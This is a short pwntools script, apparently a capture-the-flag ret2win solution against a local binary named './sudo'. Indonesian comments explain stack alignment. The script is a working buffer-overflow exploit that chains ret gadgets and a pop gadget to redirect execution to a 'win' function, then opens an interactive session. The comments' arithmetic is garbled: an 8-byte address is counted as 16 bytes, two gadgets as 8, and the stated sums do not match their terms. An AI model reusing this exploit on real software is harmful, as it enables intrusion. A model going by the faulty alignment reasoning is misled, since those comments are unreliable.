from pwn import *
elf = context.binary = ELF("./sudo")
offset = 72
p = process()
win = p64(elf.sym['win'])
rop = ROP(context.binary)
ret = p64(rop.find_gadget(['ret'])[0])
payload = b"A" * offset + ret + p64(0x000000000040113d) + p64(0xdeadbeefdeadbeef) + ret + ret + win

# jika: payload = b"A" * offset + win
# maka akan mengalami sigsev, karena ketika kita memanggil suatu fungsi, ada kemungkinan fungsi tersebut memiliki
# perintah movaps
# perintah movaps memeriksa apakah rsp align dengan 16 (apakah rsp % 16)
# offset tidak di dihitung, hanya nilai rip dan setelah rip yang masuk alignment
# jadi karena hanya ada win, maka aligment hanya 8 (dan 8 % 16 != 0)
# jadi kita perlu memperbarui menjadi payload = b"A" * offset + ret + win
# karena ret = 8 byte
# dan win = 8 byte
# maka (8 + 8 % 16 == 0)

# Adapun juga
# b"A" * offset + p64(0x000000000040113d) + p64(0xdeadbeefdeadbeef) + ret + ret + win
# p64(0x000000000040113d) = 16 byte (karena dua instruksi, pop rbp dan ret)
# p64(0xdeadbeefdeadbeef) = 8 byte
# ret + ret = 8 byte (jika di depan ret ada banyak ret maka akan tetap di anggap 1)
# win = 8 byte
# aligmnet = 16 + 8 + 8 + 8 + 8 = 48, dan untuk memastikan apakah memenuhi aligment 16 maka cek dengan 58 % 16 apakah hasilnya 8, dan ini membuat program sigsev karena tidak align

# ret = 8 byte
# p64(0x000000000040113d) = 16 byte (karena dua instruksi, pop rbp dan ret)
# p64(0xdeadbeefdeadbeef) = 8 byte
# ret + ret = 8 byte (jika di depan ret ada banyak ret maka akan tetap di anggap 1)
# win = 8 byte
# aligmnet = 8 + 16 + 8 + 8 + 8 + 8 = 48, dan untuk memastikan apakah memenuhi aligment 16 maka cek dengan 64 % 16 apakah hasilnya 0 ? jika 0 maka iya
write("payload",payload)
p.sendline(payload)
p.interactive()
